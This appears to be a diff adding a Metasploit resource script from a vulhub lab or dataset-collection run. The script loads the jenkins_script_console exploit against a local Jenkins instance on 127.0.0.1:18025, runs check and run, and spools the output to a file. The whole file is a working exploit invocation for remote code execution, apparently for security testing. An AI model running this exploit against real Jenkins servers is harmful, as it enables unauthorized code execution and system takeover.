@@ -1,0 +1,12 @@
+spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/scan.stdout
+use exploit/multi/http/jenkins_script_console
+set RHOSTS 127.0.0.1
+set RPORT 18025
+set LHOST 127.0.0.1
+set TARGETURI /
+set SSL false
+set VERBOSE true
+check
+run
+spool off
+exit
